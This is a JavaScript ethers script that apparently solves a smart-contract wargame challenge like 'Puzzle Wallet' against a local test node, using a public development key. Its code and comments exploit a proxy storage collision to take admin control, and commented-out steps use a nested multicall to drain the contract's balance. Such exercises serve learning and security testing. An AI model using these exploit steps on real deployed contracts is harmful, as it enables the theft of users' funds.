const fs = require('fs');
const { ethers, keccak256, toBeHex, zeroPad, BigNumber, zeroPadValue, getBytes, Interface } = require('ethers');
const { argv } = require('node:process');

const provider = new ethers.JsonRpcProvider('http://localhost:8545');
const privateKey = '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80';
const wallet = new ethers.Wallet(privateKey, provider);

const abi = JSON.parse(fs.readFileSync('build/Hack.abi', 'utf8'));

// const contractAddress = argv[2];
// const contract = new ethers.Contract(contractAddress, abi, wallet);


// contract.on("Log", (msg,succ) => {
//   console.log("Log:", msg);
// });





// hide all tokens to outside account
// make values of token2 = 10 token1
// keep selling token1 untill done 


  const adminAbi = [
    "function admin() view returns (address)",
    "function pendingAdmin() view returns (address)",
    "function approveNewAdmin(address _expectedAdmin)",
    "function upgradeTo(address _newImplementation)"
  ];

  const ownerAbi = [
    "function owner() view returns (address)",
    "function maxBalance() view returns (uint256)",
    "function whitelisted(address) view returns (bool)",
    "function balances(address) view returns (uint256)",

    "function proposeNewAdmin(address _newAdmin)",
    "function approveNewAdmin(address _expectedAdmin)",


    "function init(uint256 _maxBalance)",
    "function setMaxBalance(uint256 _maxBalance)",
    "function addToWhitelist(address addr)",
    "function deposit() payable",
    "function execute(address to, uint256 value, bytes data) payable",
    "function multicall(bytes[] data) payable"
  ];



async function main() {
  const addr_owner = "0x5c2D64Cb57a5F05DA44FBE16a9bff70AA49c66cE";
  const cont_owner = new ethers.Contract(addr_owner,ownerAbi,wallet);

  const addr_admin = await cont_owner.owner();
  const cont_admin = new ethers.Contract(addr_admin,adminAbi,wallet);


  const addr_hack = "0xc0F115A19107322cFBf1cDBC7ea011C19EbDB4F8";
  const cont_hack = new ethers.Contract(addr_hack,abi,wallet);
  
  // await (await cont_owner.proposeNewAdmin(wallet.address)).wait();
  // await (await cont_owner.addToWhitelist(wallet.address)).wait();
  // await (await cont_owner.addToWhitelist(addr_hack)).wait();
  // await (await cont_owner.execute(addr_hack,(await provider.getBalance(addr_owner)).toString(),"0x")).wait();



  // await (await cont_owner.deposit({value : ethers.parseEther("0.1")})).wait();
  // await (await cont_owner.execute(addr_hack,(await provider.getBalance(addr_owner)).toString(),"0x")).wait();

  const iface = new Interface([
    "function deposit() payable",
    "function execute(address to, uint256 value, bytes data) payable",
    "function multicall(bytes[] data) payable",
    "function hack() public payable"
  ]);

  // const amount = ethers.parseEther("0.001");
  // const deposit = iface.encodeFunctionData("deposit");
  // const multicall = iface.encodeFunctionData("multicall",[[deposit]]);
  // await (await cont_owner.multicall([deposit,multicall],{value: amount})).wait();
  // await (await cont_owner.execute(addr_hack,ethers.parseEther("0.004"),iface.encodeFunctionData("hack"))).wait();
  // console.log(ethers.formatEther(await cont_owner.balances(wallet.address)));
  // console.log(ethers.formatEther(await provider.getBalance(addr_owner)));
  await (await cont_owner.setMaxBalance(wallet.address)).wait();

  
  // const execute = iface.encodeFunctionData("execute",[addr_hack,(await provider.getBalance(addr_owner)).toString(),deposit]);
  // try {
    // await (await cont_owner.multicall([execute],{value: amount})).wait();
  // } catch(err) {
    // console.log(err.message)
  // }

}

main();






// possible_admin and owner have the same storage slot
// drain the contract and reset balance